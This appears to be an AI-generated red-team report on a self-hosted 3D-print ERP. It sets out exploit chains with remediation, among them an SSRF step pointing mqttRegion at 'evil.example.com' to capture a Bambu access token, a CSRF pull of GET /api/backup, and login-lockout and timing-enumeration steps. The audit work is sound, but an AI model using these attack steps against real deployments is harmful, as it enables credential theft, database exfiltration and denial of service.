---
type: deliverable
pipeline: review
phase: 5
skill: mr-robot
name: Adversarial Analysis Report
version: 1
status: draft
created: 2026-08-05T00:00:00Z
---

# ADVERSARIAL ANALYSIS REPORT — GeekBOX Print Management

> Red-team of a single-user, self-hosted 3D-print ERP (Fastify 5 + better-sqlite3/Drizzle,
> React 19 SPA, MQTT/SSE, cookie-session auth). Cannot run the app (native binding needs
> Node 22 toolchain unavailable), so runtime-dependent chains are marked **Likely**, not
> **Proven**, per SKILL.md. All findings are code-path-backed; no fabrication (Iron-Law).
> Attacker model: the realistic threat is (a) an **authenticated** operator abusing the
> single session, (b) a **cross-site** attacker leveraging the browser via CSRF, and
> (c) supply-chain / CI compromise. There is exactly one legitimate user and no RBAC (C-03),
> so "privilege escalation between users" and "BOLA across tenants" are out of the threat
> model by design — impact is weighed accordingly.

## Attack Surface Summary
- **Entry points:** 62 HTTP routes across 6 routers (auth 5, inventory 24, procurement 9, integration 20, jobs 11, system 2) + 1 SSE stream (`GET /api/events`) + static SPA. 3 pre-auth routes (`POST /api/auth/setup`, `POST /api/auth/login`, `GET /api/health`). Outbound: Bambu REST (`https://api.bambulab.com`) and MQTT (`mqtts://{region}...:8883`).
- **Trust boundaries:** (1) session gate onRequest hook (deny-by-default), (2) login/setup credential boundary, (3) Zod request-body validation at every route, (4) token vault crypto boundary (AES-256-GCM), (5) outbound Bambu cloud boundary (user-influenced `mqttRegion`), (6) the single ledger write path (ADR-009).
- **Dependencies (direct/transitive):** ~30 direct across 3 packages / 559 resolved in lockfile (all sha512-pinned).
- **Attack surface classification:** **Moderate.** Broad authenticated API, but a strong deny-by-default gate, exact-pinned deps, argon2id hashing, correct AEAD token vault, and parameterized ORM queries throughout eliminate the usual high-severity classes (no SQLi, no command-exec, no unsafe deserialization, no `dangerouslySetInnerHTML`). Residual risk concentrates in **authenticated SSRF/token-exfil**, **CSRF on state-changing endpoints**, **auth self-DoS**, **ledger integrity abuse**, and **CI supply-chain hardening**.

---

## Exploit Chains

---

## Exploit Chain: MR-001 — Authenticated SSRF → Bambu Access-Token Exfiltration via `mqttRegion`

### Classification
- **Primary CWE:** CWE-918 (SSRF) → CWE-522 (Insufficiently Protected Credentials)
- **CVSS 4.0 Score:** 6.9 (Medium) — `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:L`
- **Severity:** Medium (escalated from security-review SEC-004 "Low" — a concrete token-exfil path exists)
- **MITRE ATT&CK:** T1190, T1048 (Exfiltration Over Alternative Protocol), T1552

### Preconditions
- Attacker holds a valid session (the single operator, OR a hijacked cookie / a CSRF write — see MR-002), and a Bambu account is linked (access token present in the vault).
- Attacker controls a host reachable on `:8883` presenting a **valid CA-signed TLS certificate** (e.g. free Let's Encrypt on `evil.example.com`). `rejectUnauthorized:true` (mqtt-adapter.ts:54) blocks self-signed certs but NOT a legitimately-issued cert for an attacker domain.

### Attack Steps
1. Authenticated request sets the broker host:
   - `PATCH /api/integration/settings` body `{ "mqttRegion": "evil.example.com" }`
   - Schema accepts any non-empty string: `integrationSettingsPatchSchema` → `mqttRegion: z.string().min(1)` (`packages/shared/src/schemas/index.ts:166`). No hostname allow-list.
   - Code path: `integration/router.ts:37` → `IntegrationService.updateSettings` (`integration/linking/service.ts:110-125`) persists `mqttRegion` then calls `supervisor.restart()`.
2. Supervisor rebuilds the telemetry source:
   - `makeTelemetrySource()` (`integration/linking/service.ts:344,349-354`) reads `region = mqttRegionOverride ?? l.mqttRegion` and constructs `BambuMqttAdapter({ region, accessToken: <decrypted token>, ... })`.
   - `accessToken()` decrypts the vault token (`service.ts:219-227`).
3. Outbound connection leaks the credential:
   - `brokerUrl("evil.example.com")` → because the string contains `.`, returns `mqtts://evil.example.com:8883` (`mqtt-adapter.ts:12-15`).
   - `connectFn(url, { username: 'u_<uid>', password: <decrypted Bambu access token> })` (`mqtt-adapter.ts:49-55`). The attacker's broker receives the CONNECT packet and captures the Bambu **access token** as the MQTT password.
4. Impact realization: attacker replays the token against `https://api.bambulab.com` (`/v1/iot-service/api/user/bind`, `/v1/user-service/my/tasks` — see rest-adapter.ts:66-80) to read the victim's printers, tasks, and account-linked data.

### Impact
- **Confidentiality:** High (Bambu cloud access token → victim's cloud printer fleet + task history).
- **Integrity:** Low (token scope limited to Bambu account, not the ERP DB).
- **Availability:** Low (telemetry listener points at attacker host; local ERP unaffected).

### Evidence
- `packages/shared/src/schemas/index.ts:164-168` — `mqttRegion: z.string().min(1).optional()` (no allow-list).
- `apps/backend/src/integration/bambu/mqtt-adapter.ts:12-15` — arbitrary-hostname broker URL.
- `apps/backend/src/integration/bambu/mqtt-adapter.ts:49-55` — token sent as MQTT password to the user-chosen host.
- `apps/backend/src/integration/linking/service.ts:110-125, 344-354` — persist + rebuild source with the token.

### Why not Higher
Single-user gate means the "attacker" is usually the legitimate operator (self-harm only). It becomes a genuine cross-principal exploit only when combined with cookie theft or the CSRF chain (MR-002). `rejectUnauthorized:true` raises the bar (attacker needs a valid cert). This is why it lands Medium, not High — but it is a **real, code-complete exfiltration path**, not the theoretical "Low" that a defensive read suggested.

### Remediation
- **Immediate:** Allow-list `mqttRegion` to `{us, eu, cn}` (or an explicit set of Bambu broker hostnames). Reject anything else: `z.enum(['us','eu','cn'])` or a strict regex + hostname allow-list before building the URL in `brokerUrl`.
- **Comprehensive:** Never let a persisted setting choose the destination for a secret-bearing outbound connection. Pin the broker host to a compiled constant keyed by region code; treat `MQTT_REGION` env override as trusted-operator-only, not the DB-backed API setting.

---

## Exploit Chain: MR-002 — CSRF → State-Changing Actions incl. Backup Download & Integration Unlink (chains into MR-001)

### Classification
- **Primary CWE:** CWE-352 (CSRF)
- **CVSS 4.0 Score:** 5.1 (Medium) — `AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:L`
- **Severity:** Medium (security-review SEC-003 rated Low; upgraded because concrete state-changing + secret-exposing sinks exist and CSP is disabled)
- **MITRE ATT&CK:** T1190, T1203

### Preconditions
- Victim (the operator) is logged in (session cookie live) and visits an attacker-controlled web page in the same browser.
- Cookie is `SameSite=Lax` (`identity/router.ts:9`), so **cross-site top-level GET navigations still send the cookie**; simple `POST`/form submissions are constrained by Lax but not eliminated for navigational requests.

### Attack Steps
1. **GET-based sensitive action (works under Lax):** attacker page does `window.location = 'http://gbx-host:8080/api/backup'` or embeds `<img src>`/`<iframe>` to `GET /api/backup`. The session gate allows it (valid cookie), and `system-routes.ts:33-41` **creates a fresh backup file on disk** and streams the entire SQLite DB as an attachment. This is a state-changing GET (writes a backup artifact to `BACKUP_DIR`) and, if the response is observable to the attacker context, a full-DB exfiltration. Even if the response body is opaque cross-origin, the **disk write side-effect always fires** (unbounded backup files → disk-fill DoS by repeated triggering).
   - Code path: `http/system-routes.ts:33` → `createBackup(c.db, c.config.backupDir)`.
2. **No CSRF token anywhere:** the gate checks only cookie presence (`http/session-gate.ts:31-50`); there is no `Origin`/`Referer` check, no CSRF token, no double-submit. No route opts into any anti-CSRF control.
3. **Chain amplification:** combine with MR-001 — a crafted cross-site `fetch`/form to `PATCH /api/integration/settings` (JSON) is blocked by Lax for cross-site XHR in modern browsers, BUT `DELETE /api/integration/link` / `POST /api/integration/link` and other writes remain CSRF-relevant where navigational or `simple`-content-type requests can be forged. The reliably-forgeable vector under Lax is the **GET `/api/backup`** and **GET `/api/jobs/export.csv`** data-exfil/side-effect endpoints.

### Impact
- **Confidentiality:** Low→High conditionally (full DB via `/api/backup` if response observable).
- **Integrity:** Low (unlink/settings writes where forgeable).
- **Availability:** Low (repeated backup writes fill `BACKUP_DIR`).

### Evidence
- `apps/backend/src/identity/router.ts:7-13` — `sameSite:'lax'`, no CSRF token.
- `apps/backend/src/app.ts:34` — `contentSecurityPolicy:false` (no `frame-ancestors`/`form-action` defense-in-depth).
- `apps/backend/src/http/system-routes.ts:33-41` — **state-changing GET** that writes + streams the whole DB.
- `apps/backend/src/http/session-gate.ts:31-50` — cookie-only check, no Origin validation.

### Remediation
- **Immediate:** Add an `Origin`/`Referer` allow-list check in the session gate for all non-GET API routes; convert `/api/backup` to `POST` (state-changing must not be GET); add `SameSite=Strict` for the session cookie (single-user app has no cross-site login flow to break).
- **Comprehensive:** Enable a CSP with `frame-ancestors 'none'` and `form-action 'self'`; adopt the double-submit-cookie or `@fastify/csrf-protection` token for all mutating routes.

---

## Exploit Chain: MR-003 — Un-keyed Login Throttle → Single-User Lockout (Self-DoS) + Timing Username Enumeration

### Classification
- **Primary CWE:** CWE-307 (Improper Restriction of Excessive Auth Attempts) + CWE-208 (Timing Discrepancy)
- **CVSS 4.0 Score:** 5.3 (Medium) — `AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:L`
- **Severity:** Medium (security-review SEC-001 Medium / SEC-002 Medium — validated as chainable)
- **MITRE ATT&CK:** T1110 (Brute Force), T1110.004, OTG-AUTHN-002/003

### Preconditions
- Unauthenticated network access to `POST /api/auth/login` (allow-listed pre-auth, `session-gate.ts:19`).

### Attack Steps
1. **Denial-of-login (self-DoS of the sole user):** the throttle is a **single global bucket, not keyed by IP or username** (`identity/throttle.ts:14` — one `private bucket` per process). An unauthenticated attacker sends 10 bad logins in 15 min (`MAX_FAILS=10`, `throttle.ts:8`) → every subsequent attempt, *including the legitimate operator's correct password*, is rejected with a ≥30 s cooldown (`throttle.ts:26-31`, applied in `service.ts:49-52`). Sustained low-rate bad attempts (1 every <30 s) keep the only user permanently locked out. Because the ledger is in-memory it resets on restart — but the attacker simply resumes.
   - Code path: `identity/router.ts:22` → `IdentityService.login` (`service.ts:48-59`) → `LoginThrottle.check/recordFailure`.
2. **Username enumeration via timing (SEC-002):** `service.ts:53-55` — when the username does NOT exist, `verifyPassword` is **skipped** (`user ? await verifyPassword(...) : false`). argon2id verification costs tens of ms; the missing-user path returns in sub-ms. An attacker measures response latency on `POST /api/auth/login` to distinguish "valid username, wrong password" (slow, argon2 runs) from "invalid username" (fast). The `throttle.check()` gate fires *before* the DB lookup, so once tripped it masks timing — but during the first 10 attempts (or after any restart / window reset) the oracle is observable.
3. **Combined:** enumerate the real username via timing, then use the un-keyed throttle to lock the operator out at will (extortion / disruption of a self-hosted business tool).

### Impact
- **Confidentiality:** Low (username disclosure).
- **Integrity:** None.
- **Availability:** Low→Medium (the single legitimate user can be denied login indefinitely by an unauthenticated attacker).

### Evidence
- `apps/backend/src/identity/throttle.ts:11-16` — one global `Bucket`; no IP/username key.
- `apps/backend/src/identity/service.ts:53-55` — argon2 verify skipped for unknown user (timing oracle).
- `apps/backend/src/app.ts:36-40` — `@fastify/rate-limit` registered `global:false`; `identity/router.ts:22` login route does NOT opt in (no `config.rateLimit`).

### Remediation
- **Immediate:** Always run `verifyPassword` against a fixed dummy argon2 hash when the user is missing (constant-time-ish), closing the enumeration oracle. Add `@fastify/rate-limit` per-route config keyed by source IP to `POST /api/auth/login`.
- **Comprehensive:** Key the throttle by source IP (not a single global counter) so a remote attacker cannot lock out the local operator; consider an allow-list for the operator's own network / a break-glass local-only login.

---

## Exploit Chain: MR-004 — Ledger Balance Inflation via Reverse-of-Floored-Over-Consumption (BUG-001 weaponized)

### Classification
- **Primary CWE:** CWE-682 (Incorrect Calculation) / CWE-840 (Business Logic Errors)
- **CVSS 4.0 Score:** 4.8 (Medium) — `AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N` (single-user integrity self-corruption limits real impact)
- **Severity:** Medium
- **MITRE ATT&CK:** T1565 (Data Manipulation), OTG-BUSLOGIC-001/004

### Preconditions
- Authenticated operator (the only user). No cross-user angle; this is data-integrity abuse of the LOAD-BEARING inventory ledger, exploitable to **inflate inventory valuation / material-on-hand** beyond physical reality (e.g. to game cost reports or hide shrinkage).

### Attack Steps
1. Create a manual job whose usage over-consumes a spool:
   - Register a spool with 100 g (`POST /api/spools`), then `POST /api/jobs` (`manualJobInputSchema`) with a usage `usedG: 150` on that spool.
   - `applyEntry` computes `rawBalance = 100 + (-150) = -50`, sets `overConsumption=true`, floors `balanceAfterG=0`, but **persists `deltaG = -150`** (the un-floored delta) — `inventory/ledger/ledger-write.ts:72-94`. Spool balance is now 0; ledger records a -150 consumption entry.
2. Correct the job to reverse-and-repost:
   - `PATCH /api/jobs/:id` (`jobCorrectionSchema`) with the same usage, moving it to a *different* spool (or lowering grams).
   - `correctConsumption` reverses the live entry with `deltaG: -live.deltaG = -(-150) = +150` (`ledger-write.ts:214-222`). `applyEntry` now computes `rawBalance = 0 + 150 = 150` and sets `balanceAfterG = 150`.
   - **Net result: the spool that physically held only 100 g now shows 150 g remaining** — 50 g of phantom filament created, exactly the over-consumed amount that was silently floored. The reversal restores the *nominal* delta, not the *floored* delta actually deducted.
3. Repeat to inflate arbitrarily; each floored over-consumption + reversal injects phantom mass. `spoolValuationMinor` (spool/service.ts:240) then over-values inventory, and `inventory/summary` / low-stock alerts reflect the inflated figure.

### Impact
- **Confidentiality:** None.
- **Integrity:** High (the authoritative inventory ledger — the app's core invariant — is corrupted; valuation and stock reports lie).
- **Availability:** None.

### Evidence
- `apps/backend/src/inventory/ledger/ledger-write.ts:72-74` — floor-at-zero drops the over-consumed amount but keeps `deltaG` un-floored in the entry.
- `apps/backend/src/inventory/ledger/ledger-write.ts:214-222` — reversal uses `-live.deltaG` (full nominal), not the actually-applied floored delta → inflation.
- Note: `balanceMatchesLastEntry` (invariants.ts:12-24) still passes (it only checks last entry == spool balance), so the property-test suite does **not** catch this — the invariant set is blind to conservation-of-mass across floor+reverse.

### Remediation
- **Immediate:** In `applyEntry`, when flooring, record the *effective* applied delta (`effectiveDelta = balanceAfterG - previousBalance`) and have reversals negate the effective delta, not the stored nominal `deltaG`. Alternatively store both `deltaG` (nominal) and `appliedDeltaG` (post-floor) and reverse by `-appliedDeltaG`.
- **Comprehensive:** Add a conservation invariant to `invariants.ts`: for any consumption reversed later, `reversal.appliedDelta == -consumption.appliedDelta`, and the running balance is reconstructable from applied deltas alone. Prevent over-consumption from being silently floored on manual entries (reject or require explicit confirm).

---

## Exploit Chain: MR-005 — Unbounded SSE Connections & Un-paginated List Endpoints → Resource Exhaustion

### Classification
- **Primary CWE:** CWE-770 (Allocation of Resources Without Limits) — OWASP API4:2023
- **CVSS 4.0 Score:** 4.0 (Medium/Low border) — `AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L`
- **Severity:** Low (authenticated, single-user; still a real self-DoS / stolen-session amplifier)
- **MITRE ATT&CK:** T1499 (Endpoint DoS)

### Preconditions
- A valid session (operator or hijacked cookie). No per-connection or per-IP cap.

### Attack Steps
1. Open many `GET /api/events` streams. Each adds a `send` closure to an unbounded `Set` and a 25 s keep-alive `setInterval` (`http/sse.ts:97-119`); nothing caps concurrent clients. `mem_limit: 768m` (docker-compose.yml) makes exhaustion reachable.
2. Every domain event fans out to all clients (`sse.ts:92-95`); N connections × event rate multiplies CPU/socket usage.
3. List endpoints load full tables into memory and filter in JS (`spool.list` → `select().from(spool).all()` then `.filter` in `inventory/spool/service.ts:41-48`; `jobs.list` similarly `printJob).all()` at `jobs/job/service.ts:50`). No pagination/`LIMIT` on any list route (inventory/procurement/jobs routers). Large datasets → unbounded memory per request.

### Impact: Availability Low (OOM-kill within the 768 MB container; auto-`restart: unless-stopped` recovers, so it is disruption, not permanent).

### Evidence
- `apps/backend/src/http/sse.ts:97-119` — no client cap; per-connection interval.
- `apps/backend/src/inventory/spool/service.ts:41-48`, `apps/backend/src/jobs/job/service.ts:50` — `.all()` full-table reads, in-memory filtering, no pagination.

### Remediation
- **Immediate:** Cap concurrent SSE clients (e.g. ≤ 4) and reject beyond; add `@fastify/rate-limit` global-on for authenticated routes. **Comprehensive:** Push filtering into SQL with `WHERE`/`LIMIT`/`OFFSET`; add mandatory pagination on list endpoints.

---

## Supply Chain Assessment
- **Lock file integrity:** **PASS.** `pnpm-lock.yaml` v9.0; 559/559 `resolution:` entries carry `sha512` integrity; all resolve to the public npm registry (no git/tarball/alternate hosts); no `overrides`/`patchedDependencies`. CI enforces `--frozen-lockfile` in all jobs.
- **Dependency health:** **Good.** 100% exact-pinned direct deps (no `^`/`~`): fastify 5.8.5, better-sqlite3 11.10.0, drizzle-orm 0.45.2, argon2 0.44.0, mqtt 5.13.1, react 19.1.1, zod 4.0.5. Lifecycle-script risk **LOW** — zero first-party install scripts; native builders (`argon2`, `better-sqlite3`, `esbuild`, `@tailwindcss/oxide`) are explicitly allow-listed via `onlyBuiltDependencies` in `pnpm-workspace.yaml`. Dependency-confusion **not exploitable**: `@geekbox/shared` referenced via `workspace:*` and all workspace packages are `private:true`.
- **Build pipeline security:** **Issues found (hardening).** `MR-006 (Low, CWE-1357 / T1195.002):` every CI action in `.github/workflows/ci.yml` is pinned to a **mutable major tag**, not a commit SHA — `actions/checkout@v4` (lines 21,37,54,69,86), `pnpm/action-setup@v4` (22,38,55,70), `actions/setup-node@v4` (25,41,58,73), `docker/setup-buildx-action@v3` (87), `docker/build-push-action@v6` (88). A compromised/retagged action would execute in CI. `MR-007 (Low):` workflow-level `permissions: packages: write` (ci.yml:11) is over-scoped — the only image job uses `push:false` and never publishes; `GITHUB_TOKEN` should default to `contents: read` only. No secrets are referenced (good). **Remediation:** pin actions to 40-char SHAs (`@<sha> # v4`); drop `packages: write`; add an `.npmrc` mapping the `@geekbox` scope to a private registry as defense-in-depth.

**Supply-chain status: Issues Found** (hardening only — no active/exploitable compromise; all real dependency-integrity controls PASS).

---

## API Security Assessment (OWASP API Top 10 — 2023)
- **API1 BOLA:** **N/A / low.** All object IDs are opaque and belong to the single tenant; there is no per-user ownership model (C-03, one user). `/api/spools/:id`, `/api/jobs/:id`, etc. have no cross-user exposure. Not exploitable in this threat model.
- **API2 Broken Auth:** **See MR-003** — un-keyed throttle self-DoS + timing enumeration. Session tokens are strong: 256-bit random, SHA-256-hashed at rest (`identity/session.ts:18-33`), deny-by-default gate. Sliding-only 7-day TTL with no absolute cap (SEC-005, `session.ts:8`) is **Low/Info** — a stolen token renews indefinitely, but there is no second principal and password change revokes other sessions (`service.ts:86`).
- **API3 BOPLA / Mass Assignment:** **Not exploitable.** Every write route parses through a closed Zod object schema and services explicitly whitelist columns via spread guards (e.g. `updatePrinter` sets only `tracked`/`name`, `service.ts:264-276`; `spoolPatch` only tare/price/notes). No `req.body`-splat into DB. Schemas do not accept `id`/`role`/`status` on create paths. **PASS.**
- **API4 Unrestricted Resource Consumption:** **See MR-005** — unbounded SSE + un-paginated `.all()` reads.
- **API5 BFLA:** **N/A.** No admin/user role separation exists (single user). All authenticated functions are intended for the one operator.
- **API7 SSRF:** **See MR-001** (`mqttRegion`). The Bambu REST base is a hardcoded constant (`rest-adapter.ts:5`) — not user-controlled — so REST SSRF is closed; only the MQTT region is injectable.
- **API8 Security Misconfiguration:** CSP disabled (`app.ts:34`), `SameSite=Lax`, no CSRF token (**MR-002**). Helmet is otherwise on; `secure` cookie flag gated on production (`identity/router.ts:10`). Error handler uses RFC 7807 problem+json (no stack leakage observed).
- **Injection:** No SQLi (Drizzle parameterized throughout, no string-built SQL; the only raw SQL is a static `SELECT 1` and a static `cloud_link` read in health, `system-routes.ts:13,18`). No command execution anywhere. CSV export escapes quotes/commas/newlines (`jobs/job/service.ts:449-454`) — note it does **not** neutralize leading `=`/`+`/`-`/`@`, so **CSV/formula injection (Low/Info)** into `jobName` is possible if the operator opens `export.csv` in a spreadsheet; recommend prefixing risky cells with `'`.

## AI/LLM Threat Assessment
- **N/A.** No LLM/AI component in the codebase. No prompt construction, no model calls. Nothing to assess.

---

## Finding Summary
| ID | Title | Severity | CVSS | CWE | Exploitable | Remediation Priority |
|----|-------|----------|------|-----|-------------|---------------------|
| MR-001 | Authenticated SSRF → Bambu token exfil via `mqttRegion` | Medium | 6.9 | CWE-918/522 | Likely | High |
| MR-002 | CSRF → backup/DB exfil + integration writes (state-changing GET) | Medium | 5.1 | CWE-352 | Likely | High |
| MR-003 | Un-keyed login throttle self-DoS + timing username enum | Medium | 5.3 | CWE-307/208 | Likely | High |
| MR-004 | Ledger balance inflation via reverse-of-floored over-consumption | Medium | 4.8 | CWE-682/840 | Proven (logic) | Medium |
| MR-005 | Unbounded SSE + un-paginated list reads → exhaustion | Low | 4.0 | CWE-770 | Likely | Medium |
| MR-006 | CI actions pinned to mutable tags (supply chain) | Low | 3.4 | CWE-1357 | Likely | Medium |
| MR-007 | CI `packages: write` over-scoped token | Low | 2.0 | CWE-250 | N/A (hardening) | Low |
| MR-008 | CSV/formula injection in `export.csv` jobName | Info | — | CWE-1236 | Likely | Low |
| MR-009 | Sliding-only session, no absolute cap (SEC-005) | Info | — | CWE-613 | Likely | Low |

**Proven vs Likely:** MR-004 is **Proven at the logic level** (deterministic arithmetic on read code paths, no runtime needed). MR-001/002/003/005/006 are **Likely** (require runtime/browser/network to fully demonstrate; app not runnable here per constraints). MR-007 is a hardening observation.

**Not re-reported:** the token-vault `iv12‖tag16‖ct` layout (token-vault.ts:13-28) was verified correct by security-review and independently re-confirmed here (matched encrypt/decrypt offsets 0-12/12-28/28+) — no new flaw. argon2id hashing, deny-by-default gate, and parameterized queries are sound.

## Tool Recommendations
- **DAST/runtime:** run the app (Node 22 + toolchain), then confirm MR-001 with a rogue MQTT broker (mosquitto + valid Let's Encrypt cert) capturing the CONNECT password; confirm MR-003 timing oracle with a latency-diff harness against `/api/auth/login`.
- **CSRF:** `Origin`-forgery test harness + browser PoC page hitting `GET /api/backup`.
- **Ledger:** unit test reproducing MR-004 (register 100 g → job usage 150 g → correct) asserting final balance ≤ 100 g; add the conservation invariant.
- **Supply chain:** `pinact` / `zizmor` to enforce SHA-pinned actions; `pnpm audit --audit-level=high` (already in CI) + `osv-scanner`.
- **Static:** `semgrep --config p/owasp-top-ten` and `--config p/nodejsscan` for regression.

---
## Pipeline Summary (Machine-Readable)

phase_id: 5
skill: mr-robot
status: COMPLETE
risk_assessment: Medium
finding_count:
  critical: 0
  high: 0
  medium: 4
  low: 3
  informational: 2
exploit_chain_count: 5
supply_chain_status: Issues Found
verdict: Medium Risk
key_concerns:
  - "MR-001 Authenticated SSRF via mqttRegion exfiltrates the Bambu access token to an attacker-chosen MQTT broker (integration/bambu/mqtt-adapter.ts:12-15,49-55; schemas/index.ts:166)"
  - "MR-002 CSRF on state-changing GET /api/backup streams the full SQLite DB; SameSite=Lax + CSP disabled + no CSRF token (system-routes.ts:33-41; identity/router.ts:9; app.ts:34)"
  - "MR-003 Un-keyed global login throttle lets an unauthenticated attacker lock out the sole operator; argon2 verify skipped for unknown users leaks usernames by timing (throttle.ts:11-16; service.ts:53-55)"
cross_references:
  - "apps/backend/src/integration/bambu/mqtt-adapter.ts:12-15"
  - "apps/backend/src/integration/bambu/mqtt-adapter.ts:49-55"
  - "packages/shared/src/schemas/index.ts:166"
  - "apps/backend/src/http/system-routes.ts:33-41"
  - "apps/backend/src/identity/router.ts:9"
  - "apps/backend/src/app.ts:34"
  - "apps/backend/src/identity/throttle.ts:11-16"
  - "apps/backend/src/identity/service.ts:53-55"
  - "apps/backend/src/inventory/ledger/ledger-write.ts:72-74"
  - "apps/backend/src/inventory/ledger/ledger-write.ts:214-222"
  - "apps/backend/src/http/sse.ts:97-119"
  - ".github/workflows/ci.yml:11"
  - ".github/workflows/ci.yml:21"
---
